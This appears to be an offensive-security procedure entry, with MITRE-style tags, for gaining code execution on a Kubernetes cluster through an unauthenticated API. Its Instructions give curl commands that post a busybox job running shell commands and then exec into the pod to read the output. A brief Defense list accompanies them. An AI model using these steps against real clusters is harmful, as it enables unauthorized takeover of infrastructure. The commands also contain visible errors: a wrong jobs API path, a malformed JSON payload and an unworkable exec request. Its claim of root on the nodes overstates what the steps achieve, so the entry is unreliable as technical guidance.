---
tags:
  - execution
  - rce
  - kubernetes
  - os-command-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/kubectl-create-job-rce]]'
verified: false
platforms:
  - Kubernetes
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:32:48.635Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques:
  - '[[Unix Shell]]'
id: dca0f7fa-e1c9-4765-ab14-34b677971f59
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Execute-Arbitrary-Code-as-Cluster-Admin

## Summary

This procedure exploits the unauthorized API to create and run Kubernetes jobs or pods that execute arbitrary OS commands, achieving RCE with cluster-admin privileges on the underlying nodes.

## Description

In the Snapchat incident, the exposed API allowed direct creation of jobs injecting OS commands, bypassing normal controls. This leverages Kubernetes' batch API for shell execution in containers like busybox. Prerequisites: Confirmed API access; outcomes: Full control over cluster nodes via injected commands.

## Requirements

1. Unauthenticated API access
2. JSON knowledge for API payloads
3. HTTP client like curl

## Defense

Defensive measures and detection strategies:

- Enforce Pod Security Policies (PSP) or Pod Security Admission (PSA) to restrict privileged containers
- Audit API requests for anomalous job creations
- Use admission controllers like OPA Gatekeeper to validate workloads

## Objectives

1. Achieve remote code execution
2. Run commands as root on nodes
3. Escalate to infrastructure control

## Instructions

### Step 1: Create Malicious Job

**Context**: POST a job spec to run a shell command.

**Command** ([[commands/kubectl-create-job-rce]]):

```bash
curl -k -X POST https://<target-ip>:6443/api/v1/namespaces/default/jobs \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"batch/v1","kind":"Job","metadata":{"name":"rce-job"},"spec":{"template":{"spec":{"containers":[{"name":"rce","image":"busybox","command":["sh","-c","id > /tmp/output"]}],"restartPolicy":"Never"}},"backoffLimit":0}'}'
```

> Job created; check status for success.

### Step 2: Retrieve Execution Output

**Context**: Exec into pod to get command results.

**Command** ([[commands/kubectl-create-job-rce]]):

```bash
curl -k https://<target-ip>:6443/api/v1/namespaces/default/pods/rce-job-xxx/exec?command=cat&command=/tmp/output
```

> Output: e.g., "uid=0(root) gid=0(root)", confirming root RCE.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Unix Shell]] Command and Scripting Interpreter: Unix Shell

### Sub-Techniques

- [[Unix Shell]]

## Commands Used

- [[commands/kubectl-create-job-rce]]

## Tools Used

- None

## Tags

- [[Execution]]
- [[rce]]
- [[kubernetes]]
- [[os-command-injection]]
